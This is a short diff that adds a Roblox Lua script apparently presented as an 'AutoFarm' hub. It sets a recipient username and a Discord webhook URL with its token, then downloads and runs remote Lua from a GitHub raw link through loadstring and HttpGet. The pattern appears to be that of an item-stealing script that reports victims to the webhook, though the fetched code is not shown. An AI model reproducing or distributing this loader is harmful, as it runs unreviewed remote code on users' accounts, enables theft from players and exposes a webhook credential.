@@ -1,0 +1,5 @@
+_G.Username = "Adampadawan11"
+_G.HubName = "AutoFarm"
+_G.WebhookUrl = "https://discordapp.com/api/webhooks/1158018289625202808/oiQTRngm-A6m5E9EMtJGQyEbg-cau6IVd-3dFhkcvb3SstWsaoXqCHEjfqYudzTCPHZC"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/Peak0nTop/main/peak.lua"))()
